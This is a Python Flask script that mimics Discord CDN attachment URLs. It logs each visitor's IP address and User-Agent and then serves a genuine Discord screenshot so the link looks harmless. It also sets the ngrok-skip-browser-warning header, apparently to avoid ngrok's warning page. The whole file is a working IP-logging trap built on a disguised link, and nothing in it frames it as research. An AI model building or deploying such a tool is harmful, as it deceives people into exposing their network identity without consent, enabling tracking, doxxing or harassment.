from flask import Flask, request, Response
import requests
import os

app = Flask(__name__)

# Original Discord image URL
IMAGE_URL = "https://cdn.discordapp.com/attachments/1272434026367684650/1309733433127211039/Screenshot_2024-11-22_at_11.13.00_PM.png"

@app.route('/attachments/<channel_id>/<attachment_id>/<filename>')
def mimic_discord_url(channel_id, attachment_id, filename):
    # Log IP and User-Agent
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown User-Agent')
    print(f"IP Logged: {user_ip}")
    print(f"User Agent: {user_agent}")

    # Log if the ngrok-skip-browser-warning header is received in the request
    print(f"ngrok-skip-browser-warning received: {request.headers.get('ngrok-skip-browser-warning')}")

    # Serve the image
    try:
        response = requests.get(IMAGE_URL, timeout=5)
        response.raise_for_status()
        return Response(response.content, content_type=response.headers.get('Content-Type', 'image/jpeg'))
    except requests.exceptions.RequestException as e:
        print(f"Error serving image: {e}")
        return "The requested image is temporarily unavailable.", 503

# Add the header to all responses
@app.after_request
def add_ngrok_skip_browser_warning(response):
    # Add the header with a value (value can be any string)
    response.headers["ngrok-skip-browser-warning"] = "true"
    return response

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
